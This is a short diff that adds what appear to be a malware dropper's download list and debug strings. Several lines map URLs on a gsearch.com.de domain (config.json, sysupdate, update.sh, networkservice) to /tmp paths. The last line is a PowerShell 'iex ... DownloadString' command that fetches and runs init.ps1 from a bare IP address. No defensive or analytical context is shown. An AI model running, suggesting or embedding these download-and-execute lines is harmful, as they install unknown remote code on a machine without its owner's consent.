@@ -1,0 +1,10 @@
+https://de.gsearch.com.de/api/config.json,/tmp/config.json
+https://de.gsearch.com.de/api/sysupdate,/tmp/sysupdate
+not need download
+i am here
+https://de.gsearch.com.de/api/update.sh,/tmp/update.sh
+https://de.gsearch.com.de/api/networkservice,/tmp/networkservice
+not tmp runing
+not tmps runing
+not tmps runing
+iex(New-Object Net.WebClient).DownloadString('http://185.181.10.234/E5DB0E07C3D7BE80V520/init.ps1')
